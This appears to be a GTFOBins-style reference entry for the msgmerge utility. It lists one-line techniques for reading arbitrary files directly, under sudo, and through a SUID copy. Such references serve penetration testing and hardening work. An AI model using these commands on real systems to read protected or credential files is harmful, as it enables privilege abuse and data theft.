---
description: The file is parsed and displayed as a Java `.properties` file, so this may not be suitable to read arbitrary binary data.
functions:
  file-read:
    - code: |
        LFILE=file_to_read
        msgmerge -P $LFILE /dev/null
  sudo:
    - code: |
        LFILE=file_to_read
        sudo msgmerge -P $LFILE /dev/null
  suid:
    - code: |
        LFILE=file_to_read
        ./msgmerge -P $LFILE /dev/null
---
